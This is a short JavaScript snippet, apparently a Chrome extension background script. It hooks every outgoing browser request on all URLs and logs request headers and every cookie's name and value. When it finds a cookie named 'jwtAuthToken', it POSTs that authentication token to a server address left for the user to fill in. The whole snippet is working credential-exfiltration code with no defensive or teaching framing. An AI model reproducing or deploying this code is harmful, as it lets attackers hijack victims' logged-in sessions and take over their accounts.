chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    console.log('Request Headers:', details.requestHeaders);
    
    chrome.cookies.getAll({ url: details.url }, function(cookies) {
      if (cookies) {
        cookies.forEach(function(cookie) {
          console.log(`Cookie Name: ${cookie.name}, Cookie Value: ${cookie.value}`);
          
          if (cookie.name === 'jwtAuthToken') {  
            const jwtToken = cookie.value;

            fetch('Enter you server address', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({ token: jwtToken })
            }).then(response => {
              console.log("Token sent successfully");
            }).catch(error => {
              console.error("Error sending token:", error);
            });
          }
        });
      } else {
        console.log("No cookies found for this URL.");
      }
    });
  },
  { urls: ["<all_urls>"] }, 
  ["requestHeaders"]
);
